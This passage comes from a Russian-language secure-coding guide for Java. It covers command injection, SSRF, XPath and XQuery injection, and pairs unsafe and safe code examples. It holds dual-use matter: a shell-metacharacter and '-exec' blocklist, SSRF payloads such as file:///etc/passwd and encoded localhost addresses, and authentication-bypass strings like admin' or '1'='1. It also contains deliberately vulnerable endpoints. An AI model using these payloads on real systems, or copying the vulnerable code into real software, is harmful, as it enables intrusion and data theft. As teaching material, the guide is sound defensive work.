    ProcessBuilder pb = new ProcessBuilder("cmd", "/c", "ping -n 1", ip);
    Process p = pb.start();
```

#### *Пример 3. Корректное использование*

В данном примере производится проверка команды по белому списку. Т.к. в белом списке имеется команда `find`, позволяющая
передать параметр `–exec { command}`, реализована дополнительная проверка аргументов по черному списку.

```java
static {
    allowedCommands.add("pwd");
    allowedCommands.add("ls");
    allowedCommands.add("ps");
    allowedCommands.add("find");
    allowedCommands.add("uname");
    allowedCommands.add("free");
    allowedCommands.add("df");
    allowedCommands.add("locate");
    allowedCommands.add("hostname");

    denyArguments.add("-exec");
}

@GetMapping("/cmdSafety")
public String execCommandSafety(
        @RequestParam(value = "command") String command,
        @RequestParam(value = "args[]", required = false) List<String> args) throws IOException {
    final List<String> cmd = new ArrayList<>();

    if (command == null || command.isEmpty()) {
        throw new IllegalArgumentException("Укажите команду");
    }
    command = command.trim().toLowerCase();

    if (!allowedCommands.contains(command)) {
        throw new IllegalArgumentException("Недопустимая команда");
    }

    cmd.add(command);

    if (args != null) {
        for (String arg : args) {
            if (denyArguments.contains(arg.trim().toLowerCase())) {
                throw new IllegalArgumentException("Недопустимый аргумент");
            }
        }
        cmd.addAll(args);
    }

    ProcessBuilder pb = new ProcessBuilder(cmd);

    // ... start process, handle exit value, input and error streams, return result
}
```

#### 5.3.3. Input validation

В крайнем случае, если отсутствует возможность использования `ProcessBuilder`, можно
воспользоваться `Runtime.getRuntime().exec(command)`, предварительно проверив команду по черным/ белым спискам и
проверив на наличие опасных спец. символов ``& | ; $ > < ` \ ! ' " ( ) 0x0a`` с помощью регулярных выражений:

```java
static Set<String> allowedCommands = new HashSet<>();
static Set<String> denyArguments = new HashSet<>();

static {
    allowedCommands.add("pwd");
    allowedCommands.add("ls");
    allowedCommands.add("ps");
    allowedCommands.add("find");
    allowedCommands.add("uname");
    allowedCommands.add("free");
    allowedCommands.add("df");
    allowedCommands.add("locate");
    allowedCommands.add("hostname");

    denyArguments.add("-exec");
}


@GetMapping("/cmdRuntimeSafe")
public String execRuntimeCommandSafety(@RequestParam String inputCmd) throws IOException {
    if (inputCmd == null || inputCmd.isEmpty()) {
        throw new IllegalArgumentException("Укажите команду");
    }

    if (Pattern.matches("^.*(([&|;$><`\\\\!'\"()])|(0x0[Aa])).*$", inputCmd)) {
        System.out.println("Недопустимая команда");
    }

    final String[] command = inputCmd.split(" ");

    if (!allowedCommands.contains(command[0].toLowerCase())) {
        throw new IllegalArgumentException("Недопустимая команда");
    }
    for (String arg : command) {
        if (denyArguments.contains(arg.toLowerCase())) {
            throw new IllegalArgumentException("Недопустимый аргумент");
        }
    }
    // ... start process, handle exit value, input and error streams, return result
```

Так же опасные спец. символы можно удалить, или заменить на безопасные:

```java
String strip = inputCmd.replaceAll"[&|;$><`\\\\!'\"()]+","");
String strip2 = inputCmd.replaceAll("[^a-zA-Z 0-9]", "");
String escape = inputCmd.replaceAll("[^a-zA-Z 0-9]", "_");
```

### 5.4. В заключении

Для предотвращения CWE-77: 'Command Injection' необходимо выполнять следующие рекомендации:

1. Используйте безопасные API-интерфейсы платформы вместо прямого вызова команд ОС;
2. Используйте структурированные механизмы, которые автоматически обеспечивают разделение данных и команд (
   параметризацию). Например - `java.lang.ProcessBuilder`;
3. Проверяйте команды и аргументы по белым и/или черным спискам;
4. Не допускайте наличие символов ``& | ; $ > < ` \ ! ' " ( ) 0x0a`` во входных данных;
5. Используйте принцип наименьших привилегий для учетной записи, под которой работает приложение.

***

## 6. CWE-918: Server-Side Request Forgery (SSRF)

![cwe-918_1.png](readme_img/cwe-918_1.png)

### 6.1. Описание

Server-Side Request Forgery — это дефект безопасности, который позволяет злоумышленнику отправлять запросы от имени
скомпрометированного сервера.

Например, риск атаки SSRF может возникнуть, если приложение для формирования запросов использует непроверенные внешние
данные. Злоумышленник может спровоцировать отправку вредоносных запросов к ресурсам, которые не доступны напрямую ему
самому, но доступны серверу.

Ещё один вариант эксплуатации SSRF – маскировка запросов. Злоумышленник "прикрывается" уязвимым сервером (посредником),
для выполнения запросов к другому серверу (целевому). В таком случае со стороны целевого сервера будет казаться, что все
запросы инициируются посредником, хотя он является лишь промежуточным звеном.

Стоит отметить:

* SSRF не ограничивается протоколом HTTP. Как правило, первым запросом является HTTP, но в случаях, когда приложение
  само выполняет второй запрос, оно может использовать различные протоколы (например, FTP, SMB, SMTP и т. д.) и схемы (например, `file://`, `dict://`, `sftp://`, `ldap://`, `tftp://`, `gopher://` и т. д.).
* Если приложение уязвимо к инъекции XML eXternal Entity (XXE), то это может быть использовано для проведения
  SSRF-атаки.

Если злоумышленник может контролировать направление запросов на стороне сервера, он потенциально может выполнить
следующие действия:

* Злоупотреблять доверительными отношениями между уязвимым сервером и другими серверами;
* Обходить ограничения на основе белых списков IP-адресов;
* Обходить службы аутентификации на основе хоста;
* Читать ресурсы, недоступные для публичного доступа, такие как trace.axd в ASP.NET или API метаданных в среде AWS;
* Сканировать внутренние сети, к которым подключен уязвимый сервер;
* Считывать файлы с веб-сервера;
* Просматривать страницы состояния и взаимодействовать с API от имени уязвимого веб-сервера;
* Получать конфиденциальную информацию, например, IP-адреса веб-сервера, находящегося за обратным прокси.

Типичная схема эксплуатации уязвимости подделки запросов на стороне сервера:

![cwe-918_2.png](readme_img/cwe-918_2.png)

### 6.2. Защитные меры

Для предотвращения подделки запросов на стороне сервера (SSRF) необходимо выполнять следующие рекомендации:

1. Используйте белый список разрешенных доменов и протоколов, из которых веб-сервер может получать удаленные ресурсы

> Не используйте черный список! У черных списков и regex одна и та же проблема: кто-то рано или поздно найдет способ их
> обойти (см. п.3).

> Данный метод не защитит от атак типа TOCTOU (Time of Check to Time of Use).
> Проблема в том, что IP-адрес запрашивается дважды: первый раз для его проверки, а второй - для выполнения запроса.
> Очень
> просто создать DNS-сервер, который будет отвечать другим IP-адресом на каждый второй запрос. В этом случае при
> проверке
> IP-адреса он может оказаться внешним IP-адресом и пройти проверку, но затем, когда будет сделан запрос, имя хоста
> разрешится в опасный внутренний адрес, что позволит повысить уровень SSRF.

2. Избегайте использования пользовательского ввода непосредственно в функциях, которые могут выполнять запросы от имени
   сервера;
3. Выполняйте очистку и фильтрацию пользовательского ввода

> Важно!
> Данный метод крайне не рекомендуется применять, т.к. практически невозможно охватить все различные сценарии, например,
> злоумышленник может использовать закодированные IP-адреса, которые будут преобразованы в IP во внутренней сети:
>* http://localhost:80
>* http://127.0.0.1:80
>* http://0.0.0.0:80
>* http://[::]:80/
>* http://[0000::1]:80/
>* http://0/
>* http://⓵⓶⓻.⓪.⓪.⓵/

> Больше примеров на
https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
> и
https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery

4. Не отправляйте необработанное тело ответа от сервера клиенту
5. Принудительно используйте только необходимые схемы URL:
   Разрешите только те схемы URL, которые использует ваше приложение. Нет необходимости разрешать `ftp://`, `file:///` или
   даже `http://`, если вы используете только `https://`;
6. Включайте аутентификацию для всех служб:
   Убедитесь, что аутентификация включена для всех служб, работающих в вашей сети.

### 6.3. Примеры

#### *Пример 1. Некорректное использование*

В данном примере отсутствуют какие-либо проверки пользовательского ввода, а сам результат выполнения запроса просто
перенаправляется пользователю.

```java

@GetMapping("open-stream-unsafe")
// test on http://httpforever.com or http://example.com to prevent SSL exceptions
public String openStreamToRemoteObjectUnsafe(@RequestParam String location) throws Exception {
    URL url = new URI(location).toURL();
    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
    return reader.lines().collect(Collectors.joining());
}
```

#### *Пример 2. Некорректное использование*

В данном случае, например, используя схему `file://` можно получить доступ к локальным файлам.

```java

@GetMapping("download-file-unsafe")
public void downloadFileUnsafe(String location, HttpServletResponse response) throws IOException, URISyntaxException {
    // remote image: /ssrf/download-file-unsafe?location=http://eu.httpbin.org/image/jpeg
    // SSRF exp: location=file:///G:/work/new_ptai_policy.json
    // SSRF exp: location=file:///etc/passwd
    URL url = new URI(location).toURL();
    response.setHeader("content-disposition", "attachment;fileName=" + url.getFile());
    int length;
    byte[] bytes = new byte[1024];
    InputStream inputStream = url.openStream(); // send request
    OutputStream outputStream = response.getOutputStream();
    while ((length = inputStream.read(bytes)) > 0) {
        outputStream.write(bytes, 0, length);
    }
}
```

#### *Пример 3. Корректное, но не рекомендуемое использование*

В данном примере производится проверка протокола и IP адреса. Использовать не рекомендуется, т.к. это вариация черного
списка.

```java

@GetMapping("download-file-safe")
public void downloadFileSafe(@RequestParam String location, HttpServletResponse response) throws Exception {
    // Проверяем протокол, запрещаем локальные адреса и отключаем редиректы.
    // Не рекомендуется использовать, т.к. это по сути вариант черного списка
    // Данный метод не защитит от атак типа TOCTOU (Time of Check to Time of Use)
    URL url = new URI(location).toURL();
    InetAddress inetAddress = InetAddress.getByName(url.getHost());

    if (!url.getProtocol().startsWith("http")) {
        // Возвращать клиенту ошибку нельзя, это только для примера
        response.getWriter().write("Wrong protocol: " + url.getProtocol());
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);
//            throw new Exception("Forbidden remote source");

    } else if (inetAddress.isAnyLocalAddress() || inetAddress.isLoopbackAddress() || inetAddress.isLinkLocalAddress()) {
        response.getWriter().write("Wrong ip address: " + inetAddress);
        response.setStatus(HttpServletResponse.SC_FORBIDDEN);

    } else {// All checks OK. Processing...
        HttpURLConnection conn = (HttpURLConnection) url.openConnection();
        conn.setInstanceFollowRedirects(false);
        conn.connect();
        conn.getInputStream().transferTo(response.getOutputStream());
    }
}
```

#### *Пример 4. Корректное использование – белый список*

```java

@GetMapping("open-stream-safe")
// test on http://httpforever.com or http://example.com to prevent SSL exceptions
public String openStreamToRemoteObjectSafe(@RequestParam String location) throws Exception {
    URL url = new URI(location).toURL();

    if (!url.getHost().equals("example.com") ||
            !url.getProtocol().equals("http") && !url.getProtocol().equals("https")) {
        throw new Exception("Forbidden remote source");
    }

    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));
    return reader.lines().collect(Collectors.joining());
}
```

#### *Пример 5. Некорректное использование*

При формировании URL с помощью конкатенации возможна эксплуатация SSRF. Примеры специальных запросов приведены в
комментариях.

```java

@GetMapping("open-page-unsafe")
public String openPageUnsafe(@RequestParam String location) throws URISyntaxException, IOException {
    /*Согласно RFC 3986 (https://www.rfc-editor.org/info/rfc3986)
    символы ';' и '@' являются зарезервированными символами, относящимися к sub-delims и gen-delims соответственно,
    и могут (или не могут) быть определены в качестве разделителей (зависит от реализации)*/

    // ssrf/open-page-unsafe?location=/anything - OK
    // ssrf/open-page-unsafe?location=;@httpforever.com - SSRF
    // ssrf/open-page-unsafe?location=;@eu.httpbin.org/image/jpeg - SSRF

    URL url = new URI("http://eu.httpbin.org" + location).toURL();
    System.out.printf("url: %s\nhost: %s\n", url, url.getHost());
    BufferedReader reader = new BufferedReader(new InputStreamReader(url.openStream()));

    return reader.lines().collect(Collectors.joining());
}
```

#### *Пример 6. Корректное, но не рекомендуемое использование*

В данном примере URL строится при помощи Spring-web’s UriComponentsBuilder. Способ довольно надежный, но не дает 100 %
гарантии предотвращения SSRF.

```java

@GetMapping("open-page-safe")
public String openPageSafe(@RequestParam String location) throws IOException {
    // Test request: /ssrf/open-page-safe?location=;@httpforever.com
    URL resultUrl = UriComponentsBuilder.newInstance().scheme("http").host("eu.httpbin.org").path("anything/").path(location).build().toUri().toURL();

    BufferedReader reader = new BufferedReader(new InputStreamReader(resultUrl.openStream()));

    return reader.lines().collect(Collectors.joining());
}
```

#### *Пример 7. Корректное использование – белый список*

```java
private static final List<String> VALID_URI = Arrays.asList("https://qwe.rty", "https://asd.fgh");
private HttpClient client = HttpClient.newHttpClient();

@Override
protected void doGet(HttpServletRequest request, HttpServletResponse response) throws IOException {
    try {
        URI uri = new URI(request.getParameter("uri"));

        // BAD: a request parameter is incorporated without validation into a HTTP request
        HttpRequest r = HttpRequest.newBuilder(uri).build();
        client.send(r, null);

        // GOOD: the request parameter is validated against a known fixed list
        if (VALID_URI.contains(request.getParameter("uri"))) {
            HttpRequest r2 = HttpRequest.newBuilder(uri).build();
            client.send(r2, null);
        }
    } catch (URISyntaxException | InterruptedException e) {
        throw new RuntimeException(e);
    }
}
```

### 6.4. Дополнительная литература

1. https://cwe.mitre.org/data/definitions/918.html
2. https://cheatsheetseries.owasp.org/cheatsheets/Server_Side_Request_Forgery_Prevention_Cheat_Sheet.html
3. https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Request%20Forgery
4. https://dzone.com/articles/the-server-side-request-forgery-vulnerability-and
5. https://blog.intigriti.com/hackademy/server-side-request-forgery-ssrf
6. https://pvs-studio.ru/ru/blog/terms/6576/
7. https://brightsec.com/blog/ssrf-server-side-request-forgery
8. https://0xn3va.gitbook.io/cheat-sheets/web-application/server-side-request-forgery

***

## 7. CWE-79: Improper Neutralization of Input During Web Page Generation ('Cross-site Scripting')

#             TODO!

***

## 8. CWE-643: Improper Neutralization of Data within XPath Expressions ('XPath Injection')

![cwe-643_1.png](readme_img/cwe-643_1.png)

### 8.1. Описание

XPath – гибкий, мощный, и простой инструмент для навигации по документам XML.

Строка XPath описывает способ выбора нужных элементов (XmlNode) из массива элементов, которые могут содержать вложенные
элементы. Начинается отбор с переданного множества элементов, на каждом шаге пути отбираются элементы, соответствующие
выражению шага, и в результате оказывается отобрано подмножество элементов, соответствующих данному пути.

Для примера возьмём следующий XML документ:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

XPath-путь `//users/user[username/text()=' admin' and password/text()='21232f297a57a5a743894a0e4a801fc3']` будет
соответствовать элементу (пользователю) с ID=002.

Как и в случае с SQL Injection, XPath Injection возникает, когда программное обеспечение использует внешний ввод для
динамического создания выражения XPath, используемого для извлечения данных из базы данных XML, но оно не нейтрализует
или неправильно нейтрализует этот ввод. Это позволяет злоумышленнику контролировать структуру запроса.

В результате злоумышленник получит контроль над информацией, выбранной из базы данных XML, и сможет использовать эту
способность для управления потоком приложений, изменения логики, получения неавторизованных данных или обхода важных
проверок (например, аутентификации).

XPath - стандартный язык; его нотация / синтаксис всегда не зависит от реализации, что означает, что атака может быть
автоматизирована. Нет разных диалектов, как это происходит в запросах к базам данных SQL.

Поскольку нет уровня контроля доступа, можно получить весь документ. Мы не столкнемся с какими-либо ограничениями,
которые мы можем знать из атак с использованием SQL-инъекций.

Предположим, у нас есть система аутентификации пользователей на веб-странице, которая использует следующий XML – файл
для хранения аутентификационных данных:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

После ввода имени пользователя и пароля программа использует XPath для поиска пользователя (определяет принадлежность
пользователя к группе доступа):

```java
XPathExpression xlogin = xPath.compile("//users/user[username/text()='" + userName +
        "'and password/text()='" + DigestUtils.md5Hex(password) + "']/group/text()");
```

Если вместо логина ввести `admin' or '`, XPath – выражение примет следующий вид:

```java
XPathExpression xlogin = xPath.compile("//users/user[username/text()='admin' or ''and password/text()='ee11cbb19052e40b07aac0ca060c23ee']/group/text()");
```

В результате, зная имя УЗ, но не зная пароля, мы претворяемся пользователем, включенным в группу Administrators, т.к.
XPath – выражение, вместо поиска элемента по совпадению логин + пароль, ищет только по совпадению логина:

![cwe-643_2.png](readme_img/cwe-643_2.png)

Если вместо логина ввести `'or contains(.,'adm') or'`, XPath – выражение примет следующий вид:

```java
XPathExpression xlogin = xPath.compile("//users/user[username/text()=''or contains(.,'adm') or''and password/text()='ee11cbb19052e40b07aac0ca060c23ee']/group/text()");
```

В результате, даже не зная правильного логина, мы претворяемся пользователем, включенным в группу Administrators, т.к.
XPath – выражение, вместо поиска элемента по совпадению логин + пароль, ищет первого попавшегося пользователя с логином,
содержащим в себе текст `adm`:

![cwe-643_3.png](readme_img/cwe-643_3.png)

### 8.2. Защитные меры

Защитные меры (на этапе реализации):

1. Используйте параметризованные запросы XPath (например, с помощью XQuery). Это поможет обеспечить разделение между
   данными и командами;

> В отличие от большинства приложений баз данных, XPath не поддерживает концепцию параметризации запросов, но вы можете
> сымитировать эту концепцию, используя другие API, например, XQuery. Вместо формирования выражений в виде строк,
> передаваемых затем в синтаксический анализатор XPath для динамического выполнения во время исполнения, можно
> параметризировать запрос, создав внешний файл, хранящий его.

2. Правильно проверяйте вводимые пользователем данные. Отклоняйте данные, где это необходимо, фильтруйте, где это
   необходимо, и избегайте, когда это необходимо. Убедитесь, что ввод, который будет использоваться в запросах XPath,
   безопасен в этом контексте;
3. Применяйте белый список при ограниченном наборе возможных значений;
4. Реализуйте правильную обработку ошибок.

Правильная обработка ошибок помогает предотвратить использование злоумышленниками сообщений об ошибках для сбора
информации о приложении или системе, на которой оно работает.

### 8.3. Примеры

Во всех примерах используется XML файл users.xml с данными пользователей:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

#### *Пример 1. Некорректное использование*

В данном примере введенные пользователем логин и пароль (его md5 hash) подставляются в XPath выражение с помощью
конкатенации. Проверка введенных значений не выполняется.

```java

@GetMapping("resolve-user-group-unsafe")
public void resolveUserGroupUnsafe(@RequestParam String userName, @RequestParam String password
        , HttpServletResponse response)
        throws IOException, SAXException, XPathExpressionException, ParserConfigurationException {

    //Инъекции в поле login: ' or '1'='1' or ' | admin' or ' | 'or contains(.,'adm') or'

    DocumentBuilder documentBuilder = DocumentBuilderFactory.newDefaultInstance().newDocumentBuilder();
    Document document = documentBuilder.parse(XML_PATH);

    XPath xPath = XPathFactory.newInstance().newXPath();
    XPathExpression xlogin = xPath.compile("//users/user[username/text()='" + userName +
            "'and password/text()='" + DigestUtils.md5Hex(password) + "']/group/text()");

    String group = xlogin.evaluate(document);

    if (!group.isEmpty()) {
        response.getWriter().write("User group (found using XPath): " + group);
    } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
}
```

#### *Пример 2. Корректное, но не рекомендуемое использование*

В данном примере используется проверка введенного пользователем логина по черному списку (регулярным выражением). Способ
не рекомендован, т.к. при составлении черных списков или использовании регулярных выражений легко ошибиться.

```java

@GetMapping("resolve-user-group-safe-sanitize")
public void resolveUserGroupSafeSanitize(@RequestParam String userName, @RequestParam String password
        , HttpServletResponse response)
        throws IOException, SAXException, XPathExpressionException, ParserConfigurationException {

    if (Pattern.matches("^.*\\W.*$", userName)) {
        throw new ResponseStatusException(HttpStatus.FORBIDDEN);
    } else {
        DocumentBuilder documentBuilder = DocumentBuilderFactory.newDefaultInstance().newDocumentBuilder();
        Document document = documentBuilder.parse(XML_PATH);

        XPath xPath = XPathFactory.newInstance().newXPath();
        XPathExpression xlogin = xPath.compile("//users/user[username/text()='" + userName +
                "'and password/text()='" + DigestUtils.md5Hex(password) + "']/group/text()");
        String group = xlogin.evaluate(document);

        if (!group.isEmpty()) {
            response.getWriter().write("User group (found using XPath): " + group);
        } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
    }
}
```

#### *Пример 3. Корректное использование – параметризация запроса*

В данном примере используется параметризация запроса с помощью javax.xml.xpath.XPathVariableResolver.

```java

@GetMapping("resolve-user-group-safe-param")
public void resolveUserGroupSafeParam(@RequestParam String userName, @RequestParam String password
        , HttpServletResponse response)
        throws IOException, SAXException, XPathExpressionException, ParserConfigurationException {
    //Для параметризации используется javax.xml.xpath.XPathVariableResolver

    DocumentBuilder documentBuilder = DocumentBuilderFactory.newDefaultInstance().newDocumentBuilder();
    Document document = documentBuilder.parse(XML_PATH);
    SimpleVariableResolver resolver = new SimpleVariableResolver();

    resolver.addVariable(new QName("username"), userName);
    resolver.addVariable(new QName("password"), DigestUtils.md5Hex(password));

    XPath xPath = XPathFactory.newInstance().newXPath();
    xPath.setXPathVariableResolver(resolver);

    XPathExpression xlogin = xPath.compile("//users/user[username/text()=$username " +
            "and password/text()=$password]/group/text()");
    String group = xlogin.evaluate(document);

    if (!group.isEmpty()) {
        response.getWriter().write("User group (found using XPath): " + group);
    } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
}

public class SimpleVariableResolver implements XPathVariableResolver {
    private static final Map<QName, Object> vars = new HashMap<>();

    public void addVariable(QName name, Object value) {
        vars.put(name, value);
    }

    public Object resolveVariable(QName name) {
        return vars.get(name);
    }
}
```

#### *Пример 4. Корректное использование – параметризация запроса с помощью javax.xml.xquery.XQPreparedExpression*

См. 9. XQuery Injection

### 8.4. Дополнительная литература

1. https://learn.snyk.io/lesson/xpath-injection/
2. XPATH INJECTION https://cqr.company/web-vulnerabilities/xpath-injection/
3. Exploiting XPath Injection
   Weaknesses https://www.netspi.com/blog/technical-blog/web-application-pentesting/exploiting-xpath-injection-weaknesses/

***

## 9. CWE-652: Improper Neutralization of Data within XQuery Expressions ('XQuery Injection')

### 9.1. Описание

XQuery Injection – это вариант классической атаки SQL - инъекции на языке XML XQuery. Программное обеспечение использует
внешний ввод для динамического создания выражения XQuery, используемого для извлечения данных из базы данных XML, но оно
не нейтрализует или неправильно нейтрализует этот ввод, что позволяет злоумышленнику контролировать структуру запроса.

В результате злоумышленник получит контроль над информацией, выбранной из базы данных XML, и сможет использовать эту
способность для управления логикой приложения, получения неавторизованных данных или обхода важных проверок (например,
аутентификации).

Предположим, у нас есть система аутентификации пользователей на веб-странице, которая использует следующий XML – файл
для хранения аутентификационных данных:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

После ввода имени пользователя и пароля приложение использует XQuery для поиска пользователя (определяет принадлежность
пользователя к группе доступа):

```java
String query = "for $x in doc(\"src/main/users.xml\")/users/user " +
        "where $x/username='" + user.getUsername() +
        "' and $x/password='" + user.getPassword() +
        "' return $x/group/text()";
```

Однако, поскольку выражение создается динамически путем объединения постоянной строки запроса и строки ввода
пользователя, запрос ведет себя правильно, только если username или password не содержат кавычки. Если злоумышленник
введет строку `admin' or '1'='1` вместо `username`, то запрос примет следующий вид:

```xqy
for $x in doc("src/main/users.xml")/users/user
where $x/username='admin'
or '1'='1' and $x/password='437b930db84b8079c2dd804a71936b5f'
return $x/group/text()
```

Добавление условия `admin' or '` приводит к тому, что выражение XQuery всегда оценивается как истинное, поэтому запрос
становится логически эквивалентным гораздо более простому запросу:
`where $x/username='admin'`

В результате, зная имя УЗ, но не зная пароля, мы претворяемся пользователем, включенным в группу Administrators, т.к.
XQuery – выражение, вместо поиска элемента по совпадению логин + пароль, ищет только по совпадению логина:

![cwe-652_1.png](readme_img/cwe-652_1.png)

### 9.2. Защитные меры

Защитные меры (на этапе реализации):

1. Используйте параметризованные запросы XQuery. Это поможет обеспечить разделение между данными и командами;
2. Правильно проверяйте вводимые пользователем данные. Отклоняйте данные, где это необходимо, фильтруйте, где это
   необходимо, и избегайте, когда это возможно. Убедитесь, что ввод, который будет использоваться в запросах XPath,
   безопасен в этом контексте;
3. Предоставляйте минимальные полномочия учетной записи, от имени которой выполняются запросы;
4. Применяйте белый список при ограниченном наборе возможных значений.
5. Реализуйте правильную обработку ошибок.

Правильная обработка ошибок помогает предотвратить использование злоумышленниками сообщений об ошибках для сбора
информации о приложении или системе, на которой оно работает.

Рассмотрим параметризованные запросы XQuery подробнее.
В параметризованном запросе необходимо объявить, что будут использоваться внешние переменные и подставить их в запрос:

```java
String query = "declare variable $username external;" +
        "declare variable $password external;" +
        "for $x in doc(\"" + XML_PATH + "\")/users/user " +
        "where $x/username=$username and $x/password=$password " +
        "return $x/group/text()";
```

Подстановка значений переменных производится с помощью метода `bindString`:

```java
XQDataSource ds = new SaxonXQDataSource();
XQConnection conn = ds.getConnection();
XQPreparedExpression expression = conn.prepareExpression(query);

expression.bindString(new QName("username"), userName, null);
expression.bindString(new QName("password"), DigestUtils.md5Hex(password), null);
```

Вводимые пользователем данные подставляются в уже скомпилированный запрос, и не могут повлиять на его логику:
![cwe-652_2.png](readme_img/cwe-652_2.png)

В параметризованных запросах имеется возможность задавать тип внешних данных, что делает данный способ еще более
безопасным – см. javax.xml.xquery.XQDynamicContext:

### 9.3. Примеры

Во всех примерах используется XML файл users.xml с данными пользователей:

```xml
<?xml version="1.0" encoding="UTF-8"?>
<users>
    <user id="001">
        <username>user</username>
        <password>ee11cbb19052e40b07aac0ca060c23ee</password>
        <group>Users</group>
        <email>user@mail</email>
    </user>
    <user id="002">
        <username>admin</username>
        <password>21232f297a57a5a743894a0e4a801fc3</password>
        <group>Administrators</group>
        <email>admin@mail</email>
    </user>
</users>
```

#### *Пример 1. Некорректное использование*

В данном примере введенные пользователем логин и пароль (его md5 hash) подставляются в XQuery выражение с помощью
конкатенации. Проверка введенных значений не выполняется.

```java

@GetMapping("resolve-user-group-unsafe")
public void resolveUserGroupUnsafe(@RequestParam String username, @RequestParam String password
        , HttpServletResponse response) throws IOException, XQException {

    //Инъекции в поле login: ' or '1'='1' or ' | admin' or '

    String query = "for $x in doc(\"" + XML_PATH + "\")/users/user " +
            "where $x/username='" + username + "' and $x/password='" + DigestUtils.md5Hex(password) +
            "' return $x/group/text()";

    XQDataSource ds = new SaxonXQDataSource();
    XQConnection conn = ds.getConnection();
    XQExpression expression = conn.createExpression();
    XQResultSequence resultSequence = expression.executeQuery(query);

    StringBuilder groups = new StringBuilder();
    while (resultSequence.next()) {
        if (!groups.isEmpty()) groups.append("\n");
        groups.append(resultSequence.getItemAsString(null));
    }

    conn.close();
    expression.close();
    resultSequence.close();

    if (!groups.isEmpty()) {
        response.getWriter().write("User group (found using XQuery): " + groups);
    } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
}
```

#### *Пример 2. Корректное использование – параметризация запроса*

В данном примере используется параметризация запроса с помощью javax.xml.xquery.XQPreparedExpression:

```java

@GetMapping("resolve-user-group-safe")
public void resolveUserGroupSafe(@RequestParam String username, @RequestParam String password
        , HttpServletResponse response) throws IOException, XQException {

    String query = "declare variable $username external;" +
            "declare variable $password external;" +
            "for $x in doc(\"" + XML_PATH + "\")/users/user " +
            "where $x/username=$username and $x/password=$password " +
            "return $x/group/text()";

    XQDataSource ds = new SaxonXQDataSource();
    XQConnection conn = ds.getConnection();
    XQPreparedExpression expression = conn.prepareExpression(query);

    expression.bindString(new QName("username"), username, null);
    expression.bindString(new QName("password"), DigestUtils.md5Hex(password), null);

    XQResultSequence resultSequence = expression.executeQuery();

    StringBuilder groups = new StringBuilder();
    while (resultSequence.next()) {
        if (!groups.isEmpty()) groups.append("\n");
        groups.append(resultSequence.getItemAsString(null));
    }

    conn.close();
    expression.close();
    resultSequence.close();

    if (!groups.isEmpty()) {
        response.getWriter().write("User group (found using XQuery): " + groups);
    } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
}
```

#### *Пример 3. Корректное использование – параметризация запроса*

В данном примере запрос вынесен в отдельный файл abc.xqy:

```xqy
declare variable $username external;
declare variable $password external;
for $x in doc("src/main/resources/xml/users.xml")/users/user
where $x/username=$username
and $x/password=$password
return $x/group/text()
```

```java

@GetMapping("resolve-user-group-safe2")
public void resolveUserGroupSafeXqy(@RequestParam String username, @RequestParam String password
        , HttpServletResponse response) throws IOException, XQException {

    InputStream query = new FileInputStream(xqyPath);
    XQDataSource ds = new SaxonXQDataSource();
    XQConnection conn = ds.getConnection();
    XQPreparedExpression expression = conn.prepareExpression(query);

    expression.bindString(new QName("username"), username, null);
    expression.bindString(new QName("password"), DigestUtils.md5Hex(password), null);

    XQResultSequence resultSequence = expression.executeQuery();

    StringBuilder groups = new StringBuilder();
    while (resultSequence.next()) {
        if (!groups.isEmpty()) groups.append("\n");
        groups.append(resultSequence.getItemAsString(null));
    }

    conn.close();
    expression.close();
    resultSequence.close();

    if (!groups.isEmpty()) {
        response.getWriter().write("User group (found using XQuery): " + groups);
    } else throw new ResponseStatusException(HttpStatus.UNAUTHORIZED, "Unknown user. Go away!");
}
```

### 9.4. Дополнительная литература

1. https://coderlessons.com/tutorials/xml-tekhnologii/uznaite-xquery/xquery-kratkoe-rukovodstvo
2. https://www.progress.com/xquery/resources/tutorials/xqj-tutorial/binding-external-variables
3. http://www.cfoster.net/articles/xqj-tutorial/binding-java-variables.xml

***

## 10. CWE-91: XML Injection (aka Blind XPath Injection)

### 10.1. Описание

Уязвимости XML или SOAP-инъекций возникают, когда пользовательский ввод вставляется в XML-документ или SOAP-сообщение на
стороне сервера небезопасным способом.

Если программное обеспечение не нейтрализует должным образом специальные элементы, которые используются в XML (такие,
как `«<», «>», «'», «“» и «&»`), это позволит злоумышленникам изменять синтаксис, содержимое или команды XML до того,
как они будут обработаны конечной системой.

